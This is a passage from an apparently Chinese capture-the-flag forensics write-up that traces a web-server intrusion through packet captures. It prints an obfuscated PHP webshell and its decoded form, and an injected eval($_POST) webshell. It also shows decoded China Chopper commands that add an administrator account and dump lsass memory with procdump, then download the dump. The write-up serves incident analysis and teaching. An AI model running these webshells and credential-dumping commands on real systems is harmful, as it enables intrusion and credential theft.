$o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]<span class="hljs-string">&quot;HTTP&gt;]_REFERE&gt;]R&quot;</span>];$ra&gt;]=@&gt;]$r[<span class="hljs-string">&quot;&gt;]HTTP_A&gt;]CC&gt;]EP&gt;&#x27;;</span><br><span class="hljs-string">$g=&#x27;&quot;</span><span class="hljs-string">&quot;;for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;&#x27;;</span><br><span class="hljs-string">$R=&#x27;$k&gt;]h=&quot;</span>cb4&gt;]<span class="hljs-number">2</span><span class="hljs-string">&quot;;$kf=&quot;</span>e13<span class="hljs-number">0</span><span class="hljs-string">&quot;&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o=&#x27;;</span><br><span class="hljs-string">$Q=&#x27;]s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;&#x27;;</span><br><span class="hljs-string">$v=&#x27;]mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array(&quot;</span>/<span class="hljs-number">_</span>/<span class="hljs-string">&quot;,&quot;</span>/-<span class="hljs-regexp">/&quot;),arr&gt;]ay(&gt;]&quot;/</span><span class="hljs-string">&quot;,&quot;</span>+<span class="hljs-string">&quot;&gt;]&#x27;;</span><br><span class="hljs-string">$x=str_replace(&#x27;&gt;]&#x27;,&#x27;&#x27;,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);</span><br><span class="hljs-string">$N=$j(&#x27;&#x27;,$x);$N();</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传的文件是<code>footer.php</code>，很明显经过了混淆。</p><p><code>footer.php</code>应该就是黑客上传的第二个马</p><p>大致解一下，输出一下<code>$x</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$kh</span> = <span class="hljs-string">&quot;cb42&quot;</span>;<br><span class="hljs-variable">$kf</span> = <span class="hljs-string">&quot;e130&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>, <span class="hljs-variable">$k</span></span>) </span>&#123;<br>    <span class="hljs-variable">$c</span> = strlen(<span class="hljs-variable">$k</span>);<br>    <span class="hljs-variable">$l</span> = strlen(<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$o</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$l</span>;) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;(<span class="hljs-variable">$j</span> &lt; <span class="hljs-variable">$c</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$l</span>);<span class="hljs-variable">$j</span>++, <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$o</span>.= <span class="hljs-variable">$t</span>&#123;<span class="hljs-variable">$i</span>&#125; ^ <span class="hljs-variable">$k</span>&#123;<span class="hljs-variable">$j</span>&#125;;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$o</span>;<br>&#125;<br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$_SERVER</span>;<br><span class="hljs-variable">$rr</span> = @<span class="hljs-variable">$r</span>[<span class="hljs-string">&quot;HTTP_REFERER&quot;</span>];<br><span class="hljs-variable">$ra</span> = @<span class="hljs-variable">$r</span>[<span class="hljs-string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$rr</span> &amp;&amp; <span class="hljs-variable">$ra</span>) &#123;<br>    <span class="hljs-variable">$u</span> = parse_url(<span class="hljs-variable">$rr</span>);<br>    parse_str(<span class="hljs-variable">$u</span>[<span class="hljs-string">&quot;query&quot;</span>], <span class="hljs-variable">$q</span>);<br>    <span class="hljs-variable">$q</span> = array_values(<span class="hljs-variable">$q</span>);<br>    preg_match_all(<span class="hljs-string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="hljs-variable">$ra</span>, <span class="hljs-variable">$m</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$q</span> &amp;&amp; <span class="hljs-variable">$m</span>) &#123;<br>        @session_start();<br>        <span class="hljs-variable">$s</span> = &amp; <span class="hljs-variable">$_SESSION</span>;<br>        <span class="hljs-variable">$ss</span> = <span class="hljs-string">&quot;substr&quot;</span>;<br>        <span class="hljs-variable">$sl</span> = <span class="hljs-string">&quot;strtolower&quot;</span>;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] . <span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>        <span class="hljs-variable">$h</span> = <span class="hljs-variable">$sl</span>(<span class="hljs-variable">$ss</span>(md5(<span class="hljs-variable">$i</span> . <span class="hljs-variable">$kh</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>));<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable">$sl</span>(<span class="hljs-variable">$ss</span>(md5(<span class="hljs-variable">$i</span> . <span class="hljs-variable">$kf</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>));<br>        <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$z</span> = <span class="hljs-number">1</span>;<span class="hljs-variable">$z</span> &lt; count(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>]);<span class="hljs-variable">$z</span>++) <span class="hljs-variable">$p</span>.= <span class="hljs-variable">$q</span>[<span class="hljs-variable">$m</span>[<span class="hljs-number">2</span>][<span class="hljs-variable">$z</span>]];<br>        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$p</span>, <span class="hljs-variable">$h</span>) === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-variable">$p</span> = <span class="hljs-variable">$ss</span>(<span class="hljs-variable">$p</span>, <span class="hljs-number">3</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (array_key_exists(<span class="hljs-variable">$i</span>, <span class="hljs-variable">$s</span>)) &#123;<br>            <span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>].= <span class="hljs-variable">$p</span>;<br>            <span class="hljs-variable">$e</span> = strpos(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>], <span class="hljs-variable">$f</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-variable">$k</span> = <span class="hljs-variable">$kh</span> . <span class="hljs-variable">$kf</span>;<br>                ob_start();<br>                @<span class="hljs-keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/_/&quot;</span>, <span class="hljs-string">&quot;/-/&quot;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>), <span class="hljs-variable">$ss</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>], <span class="hljs-number">0</span>, <span class="hljs-variable">$e</span>))), <span class="hljs-variable">$k</span>)));<br>                <span class="hljs-variable">$o</span> = ob_get_contents();<br>                ob_end_clean();<br>                <span class="hljs-variable">$d</span> = base64_encode(x(gzcompress(<span class="hljs-variable">$o</span>), <span class="hljs-variable">$k</span>));<br>                <span class="hljs-keyword">print</span> (<span class="hljs-string">&quot;&lt;<span class="hljs-subst">$k</span>&gt;<span class="hljs-subst">$d</span>&lt;/<span class="hljs-subst">$k</span>&gt;&quot;</span>);<br>                @session_destroy();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以确定这就是第二个木马了。上传时间为</p><p><code>17:20:44.248365</code></p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/5.png" alt="5"></p><p>根据小马里的内容</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$rr</span> = @<span class="hljs-symbol">$r</span>[<span class="hljs-string">&quot;HTTP_REFERER&quot;</span>];<br><br><span class="hljs-symbol">$ra</span> = @<span class="hljs-symbol">$r</span>[<span class="hljs-string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<br></code></pre></td></tr></table></figure><p>再结合后面黑客对<code>footer.php</code>的请求</p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/6.png" alt="6"></p><p>很明显可以知道黑客用<code>HTTP_REFERER</code>来传递数据。</p><p>接下来问题询问的是关于<code>MySQL</code>的，这就不能用<code>HTTP</code>了,直接过滤<code>mysql</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">mysql</span><br></code></pre></td></tr></table></figure><p>但是没有任何数据</p><p>换下一个数据包，没有。。</p><p>第三个还没有。。</p><p>打开第四个数据包。</p><p>开头就是相当多的登录请求，估计黑客是在爆破<code>MySQL</code>密码。</p><p>内网主机是<code>192.168.2.20</code></p><p>往下翻</p><p>到最后,看响应，说明黑客登录成功了</p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/7.png" alt="7"></p><p>最后一个请求就是我们要找的账号密码。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Username</span>: admin<br><br><span class="hljs-attribute">Password</span>: <span class="hljs-number">1</span>a<span class="hljs-number">3068</span>c<span class="hljs-number">3</span>e<span class="hljs-number">29</span>e<span class="hljs-number">03</span>e<span class="hljs-number">3</span>bcfdba<span class="hljs-number">6</span>f<span class="hljs-number">8669</span>ad<span class="hljs-number">23349</span>dc<span class="hljs-number">6</span>c<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>后面的题目问的关于<code>php代理</code>，有可能是用的<code>reGeorg</code>等<code>http</code>上的代理。</p><p>搜索下<code>http contains &quot;tunnel&quot;</code></p><p>成功找到<code>tunnel.php</code></p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/8.png" alt="8"></p><p>可以看到可以找到代理最先访问了 <code>4.2.2.2</code> 的<code>53</code>端口。</p><p>后面题目问的是“黑客第一次获取到当前目录下的文件列表的漏洞利用请求”,也就是说黑客有可能执行了<code>ls</code>或者<code>dir</code>命令。</p><p>接着往下找</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">(<span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span> or <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> (http contains <span class="hljs-string">&quot;dir&quot;</span> or http contains <span class="hljs-string">&quot;ls&quot;</span>)<br></code></pre></td></tr></table></figure><p>前几个数据包都没发现</p><p>第七个数据包</p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/9.png" alt="9"></p><p>可以找到疑似利用的痕迹。。但是根据响应来看并没有成功执行</p><p>第八个数据包</p><p>没有发现</p><p>第九个数据包</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">(<span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span> or <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> (http contains <span class="hljs-string">&quot;dir&quot;</span> or http contains <span class="hljs-string">&quot;ls&quot;</span><br></code></pre></td></tr></table></figure><p>过滤之后有发现了</p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/10.png" alt="10"></p><p>很容易可以知道黑客首先利用漏洞执行<code>ls</code>命令。</p><p>但没成功，后面又执行了<code>dir</code>命令，从响应中可以清晰的看到<code>dir</code>命令成功执行</p><p>时间为<code>10:36:59.770782</code></p><p>内网主机<code>192.168.2.20</code>是一台<code>Windows</code></p><p>网站目录是<code>C:phpStudy\WWW\</code></p><p>在<code>192.168.2.20</code>上可以通过漏洞直接执行命令</p><p>过滤一下看看后续操作</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>很明显可以看到黑客先后执行了 <code>dir pwd dir </code>命令</p><p>然后写了一个马<code> sh.php</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">http://192.168.2.20/install/index.php?0=system&amp;1=echo &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot; &gt; sh.php</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/11.png" alt="11"></p><p>根据后面的访问请求，黑客使用菜刀连接了<code>sh.php</code>，进行分析,这里应该利用菜刀上传了一个文件</p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/12.png" alt="12"></p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/13.png" alt="13"></p><p>看数据文件头<code>4D5A90</code></p><p>对payload解码一下</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\p</span>hpStudy<span class="hljs-symbol">\W</span>WW<span class="hljs-symbol">\b</span>2evolution<span class="hljs-symbol">\i</span>nstall<span class="hljs-symbol">\t</span>est<span class="hljs-symbol">\p</span>rocdump.exe<br></code></pre></td></tr></table></figure><p>黑客应该上传了一个叫做<code>procdump</code>的<code>exe</code>程序。</p><p>再接着往下走</p><p><code>No.375758</code></p><p>看响应黑客应该是执行了<code>net user</code>命令</p><p>分析一下请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Form item: <span class="hljs-string">&quot;action&quot;</span> = <span class="hljs-string">&quot;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5h</span><br><span class="hljs-string"></span><br><span class="hljs-string">@ini_set(&quot;</span>display_errors<span class="hljs-string">&quot;,&quot;</span>0<span class="hljs-string">&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;</span>-&gt;|<span class="hljs-string">&quot;);;<span class="hljs-variable">$p</span>=base64_decode(<span class="hljs-variable">$_POST</span>[&quot;</span>z1<span class="hljs-string">&quot;]);<span class="hljs-variable">$s</span>=base64_decode(<span class="hljs-variable">$_POST</span>[&quot;</span>z2<span class="hljs-string">&quot;]);<span class="hljs-variable">$d</span>=dirna</span><br><span class="hljs-string"></span><br><span class="hljs-string">Form item: &quot;</span>z1<span class="hljs-string">&quot; = &quot;</span>Y21k<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">cmd</span><br><span class="hljs-string"></span><br><span class="hljs-string">Form item: &quot;</span>z2<span class="hljs-string">&quot; = &quot;</span>Y2QvZCJDOlxwaHBTdHVkeVxXV1dcYjJldm9sdXRpb25caW5zdGFsbFx0ZXN0XCImbmV0IHVzZXIm<br><br>ZWNobyBbU10mY2QmZWNobyBbRV0=<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">cd/d&quot;</span>C:\phpStudy\WWW\b2evolution\install\<span class="hljs-built_in">test</span>\&quot;&amp;net user&amp;<span class="hljs-built_in">echo</span> [S]&amp;<span class="hljs-built_in">cd</span>&amp;<span class="hljs-built_in">echo</span> [E]<br></code></pre></td></tr></table></figure><p>没有猜错XD</p><p>往下<code>No.377608</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">z2</span> = Y<span class="hljs-number">2</span>QvZCJDOlxwaHBTdHVkeVxXV<span class="hljs-number">1</span>dcYjJldm<span class="hljs-number">9</span>sdXRpb<span class="hljs-number">25</span>caW<span class="hljs-number">5</span>zdGFsbFx<span class="hljs-number">0</span>ZXN<span class="hljs-number">0</span>XCImbmV<span class="hljs-number">0</span>IHVzZXIg<br><br><span class="hljs-attribute">a2FrYSBrYWthIC9hZGQmZWNobyBbU10mY2QmZWNobyBbRV0</span>=<br><br><span class="hljs-attribute">cd</span>/d<span class="hljs-string">&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br></code></pre></td></tr></table></figure><p>黑客增加了一个账号密码均为<code>kaka</code>的用户</p><p><code>No.378140</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">Form item: <span class="hljs-string">&quot;z2&quot;</span> = <span class="hljs-comment">&quot;Y2QvZCJDOlxwaHBTdHVkeVxXV1dcYjJldm9sdXRpb25caW5zdGFsbFx0ZXN0XCImbmV0IHVzZXIg</span><br><br>bG9jYWxncm91cCBhZG1pbmlzdHJhdG9yIHN0YXIgL2FkZCZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==<span class="hljs-comment">&quot;</span><br><br><span class="hljs-keyword">cd</span>/d<span class="hljs-string">&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;</span>&amp;net user localgroup administrator <span class="hljs-keyword">star</span> /<span class="hljs-built_in">add</span>&amp;<span class="hljs-keyword">echo</span> [S]&amp;<span class="hljs-keyword">cd</span>&amp;<span class="hljs-keyword">echo</span> [E]<br></code></pre></td></tr></table></figure><p><code>No.378877</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">Form item: <span class="hljs-string">&quot;z2&quot;</span> = <span class="hljs-comment">&quot;Y2QvZCJDOlxwaHBTdHVkeVxXV1dcYjJldm9sdXRpb25caW5zdGFsbFx0ZXN0XCImbmV0IHVzZXIm</span><br><br>ZWNobyBbU10mY2QmZWNobyBbRV0=<span class="hljs-comment">&quot;</span><br><br><span class="hljs-keyword">cd</span>/d<span class="hljs-string">&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;</span>&amp;net user&amp;<span class="hljs-keyword">echo</span> [S]&amp;<span class="hljs-keyword">cd</span>&amp;<span class="hljs-keyword">echo</span> [E]<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/15.png" alt="15"></p><p>成功添加用户<code>kaka</code>并将其添加到管理员组</p><p>再往下<code>No.407291</code></p><p>看响应黑客执行了之前上传的<code>procdump.exe</code>，但并没有执行成功。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">Form item: <span class="hljs-string">&quot;z2&quot;</span> = <span class="hljs-comment">&quot;Y2QvZCJDOlxwaHBTdHVkeVxXV1dcYjJldm9sdXRpb25caW5zdGFsbFx0ZXN0XCImcHJvY2R1bXAu</span><br><br>ZXhlIC1hY2NlcHRldWxhIC1tYSBsc3Bhc3NzLmRtcCZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==<span class="hljs-comment">&quot;</span><br><br><span class="hljs-keyword">cd</span>/d<span class="hljs-string">&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;</span>&amp;procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lspasss.dmp&amp;<span class="hljs-keyword">echo</span> [S]&amp;<span class="hljs-keyword">cd</span>&amp;<span class="hljs-keyword">echo</span> [E]<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/16.png" alt="16"></p><p>继续往下<code>No.424788</code></p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/17.png" alt="17"></p><p>从响应来看这次成功执行了，</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">[18:52:47] Dump 1 initiated: C:<span class="hljs-symbol">\p</span>hpStudy<span class="hljs-symbol">\W</span>WW<span class="hljs-symbol">\b</span>2evolution<span class="hljs-symbol">\i</span>nstall<span class="hljs-symbol">\t</span>est<span class="hljs-symbol">\l</span>sass.exe_180208_185247.dmp<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><code>No.431557</code>开始，黑客将生成的文件下载到自己主机上</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">z1 = <span class="hljs-string">&quot;QzpccGhwU3R1ZHlcV1dXXGIyZXZvbHV0aW9uXGluc3RhbGxcdGVzdFxsc2Fzcy5leGVfMTgwMjA4</span><br><span class="hljs-string"></span><br><span class="hljs-string">XzE4NTI0Ny5kbXA=&quot;</span><br><br><span class="hljs-symbol">C:</span>\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp<br><br>action = <span class="hljs-string">&quot;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP2Jhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSkpOmJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&quot;</span><br><br><span class="hljs-variable">@ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>);<span class="hljs-variable">@set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-variable">@set_magic_quotes_runtime</span>(<span class="hljs-number">0</span>);echo(<span class="hljs-string">&quot;-&gt;|&quot;</span>);;<span class="hljs-variable">$F</span>=get_magic_quotes_gpc()<span class="hljs-string">?b</span>ase64_decode(stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;z1&quot;</span>]))<span class="hljs-symbol">:base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;z1&quot;</span>]);<span class="hljs-variable">$fp</span>=<span class="hljs-variable">@fopen</span>(<span class="hljs-variable">$F</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">@fgetc</span>(<span class="hljs-variable">$fp</span>))&#123;<span class="hljs-variable">@fclose</span>(<span class="hljs-variable">$fp</span>);<span class="hljs-variable">@readfile</span>(<span class="hljs-variable">$F</span>);&#125;<span class="hljs-keyword">else</span>&#123;echo(<span class="hljs-string">&quot;ERROR:// Can Not 